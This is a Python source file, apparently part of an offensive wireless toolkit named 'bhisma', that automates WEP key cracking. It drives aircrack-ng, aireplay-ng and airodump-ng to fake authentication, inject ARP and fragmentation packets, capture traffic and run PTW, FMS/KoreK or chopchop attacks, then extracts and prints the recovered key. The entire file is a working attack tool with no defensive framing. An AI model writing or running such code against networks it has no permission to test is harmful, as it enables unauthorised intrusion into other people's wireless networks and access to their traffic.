"""
WEP Attack Module
=================
FMS, KoreK chopchop, PTW, and ARP replay attacks.
"""

import os
import time
from typing import Optional, Dict, Any
from dataclasses import dataclass

from bhisma.tools.binder import ToolBinder
from rich.console import Console

console = Console()


@dataclass
class WEPCrackResult:
    cracked: bool = False
    key: Optional[str] = None
    key_ascii: Optional[str] = None
    ivs_collected: int = 0
    method: str = ""
    duration_sec: float = 0.0


class WEPCracker:
    """Manages WEP cracking attacks."""

    def __init__(self, iface: str):
        self.iface = iface
        self.binder = ToolBinder()

    def attack(
        self,
        target_bssid: str,
        channel: Optional[int] = None,
        method: str = "auto",
    ) -> WEPCrackResult:
        """
        Execute WEP attack with specified or auto-selected method.

        Args:
            target_bssid: Target AP BSSID
            channel: WiFi channel
            method: "auto", "fms", "chopchop", "ptw", "replay"
        """
        console.print(f"[bold cyan][*] WEP Attack on {target_bssid} (method: {method})[/bold cyan]")
        start = time.time()

        if method == "auto":
            # Try ARP replay first (most reliable)
            result = self._arp_replay_attack(target_bssid, channel)
            if not result.cracked:
                result = self._ptw_attack(target_bssid, channel)
        elif method == "replay":
            result = self._arp_replay_attack(target_bssid, channel)
        elif method == "ptw":
            result = self._ptw_attack(target_bssid, channel)
        elif method == "chopchop":
            result = self._chopchop_attack(target_bssid, channel)
        elif method == "fms":
            result = self._fms_attack(target_bssid, channel)
        else:
            result = WEPCrackResult(method=method)

        result.duration_sec = time.time() - start
        return result

    def _arp_replay_attack(self, bssid: str, channel: Optional[int]) -> WEPCrackResult:
        """ARP replay injection to collect IVs rapidly."""
        console.print("[dim]    Phase 1: Fake authentication[/dim]")
        auth_result = self.binder.execute(
            "aireplay-ng",
            ["-1", "0", "-a", bssid, self.iface],
            timeout=30,
        )

        console.print("[dim]    Phase 2: ARP replay injection[/dim]")
        # Start airodump in background for capture
        cap_file = f"/tmp/bhisma_wep_{bssid.replace(':', '')}"
        ch = ["-c", str(channel)] if channel else []
        dump_proc = self.binder.execute(
            "airodump-ng",
            ["-w", cap_file, "--bssid", bssid] + ch + [self.iface],
            timeout=300,
        )

        # Inject ARP packets
        inject_result = self.binder.execute(
            "aireplay-ng",
            ["-3", "-b", bssid, "-h", self._get_current_mac(), self.iface],
            timeout=300,
        )

        # Crack collected IVs
        cap_file_path = f"{cap_file}-01.cap"
        if os.path.exists(cap_file_path):
            crack = self.binder.execute(
                "aircrack-ng",
                [cap_file_path],
                timeout=300,
            )
            return self._parse_aircrack(crack.stdout, "arp_replay")

        return WEPCrackResult(method="arp_replay", ivs_collected=0)

    def _ptw_attack(self, bssid: str, channel: Optional[int]) -> WEPCrackResult:
        """Pyshkin-Tews-Weinmann attack (optimized statistical)."""
        console.print("[dim]    PTW attack: collecting IVs with fragmentation[/dim]")
        cap_file = f"/tmp/bhisma_ptw_{bssid.replace(':', '')}"
        ch = ["-c", str(channel)] if channel else []

        # Fragmentation attack to generate more IVs
        frag = self.binder.execute(
            "aireplay-ng",
            ["-5", "-b", bssid, self.iface],
            timeout=120,
        )

        dump = self.binder.execute(
            "airodump-ng",
            ["-w", cap_file, "--bssid", bssid] + ch + [self.iface],
            timeout=300,
        )

        cap_path = f"{cap_file}-01.cap"
        if os.path.exists(cap_path):
            crack = self.binder.execute(
                "aircrack-ng",
                ["-z", cap_path],  # -z for PTW
                timeout=300,
            )
            return self._parse_aircrack(crack.stdout, "ptw")
        return WEPCrackResult(method="ptw")

    def _chopchop_attack(self, bssid: str, channel: Optional[int]) -> WEPCrackResult:
        """KoreK chopchop attack for arbitrary packet decryption."""
        console.print("[dim]    Chopchop attack[/dim]")
        result = self.binder.execute(
            "aireplay-ng",
            ["-4", "-b", bssid, self.iface],
            timeout=120,
        )
        return WEPCrackResult(method="chopchop")

    def _fms_attack(self, bssid: str, channel: Optional[int]) -> WEPCrackResult:
        """Fluhrer-Mantin-Shamir attack (weak IV exploitation)."""
        console.print("[dim]    FMS attack: collecting weak IVs[/dim]")
        cap_file = f"/tmp/bhisma_fms_{bssid.replace(':', '')}"
        ch = ["-c", str(channel)] if channel else []

        dump = self.binder.execute(
            "airodump-ng",
            ["-w", cap_file, "--bssid", bssid] + ch + [self.iface],
            timeout=600,
        )

        cap_path = f"{cap_file}-01.cap"
        if os.path.exists(cap_path):
            crack = self.binder.execute(
                "aircrack-ng",
                ["-K", cap_path],  # -K for KoreK/FMS
                timeout=300,
            )
            return self._parse_aircrack(crack.stdout, "fms")
        return WEPCrackResult(method="fms")

    def _parse_aircrack(self, stdout: str, method: str) -> WEPCrackResult:
        """Parse aircrack-ng output."""
        result = WEPCrackResult(method=method)
        import re

        # IV count
        iv_match = re.search(r'(\d+)\s+IVs', stdout)
        if iv_match:
            result.ivs_collected = int(iv_match.group(1))

        # Key found
        if "KEY FOUND" in stdout:
            result.cracked = True
            key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', stdout)
            if key_match:
                result.key = key_match.group(1).strip()
                # Try ASCII
                try:
                    hex_str = result.key.replace(":", "")
                    result.key_ascii = bytes.fromhex(hex_str).decode("ascii", errors="ignore")
                except Exception:
                    pass
            console.print(f"[bold green][+] WEP KEY FOUND: {result.key}[/bold green]")
        return result

    def _get_current_mac(self) -> str:
        """Get current MAC of interface."""
        import subprocess
        try:
            result = subprocess.run(["macchanger", "-s", self.iface], capture_output=True, text=True)
            import re
            match = re.search(r"([0-9A-Fa-f:]{17})", result.stdout)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "00:00:00:00:00:00"
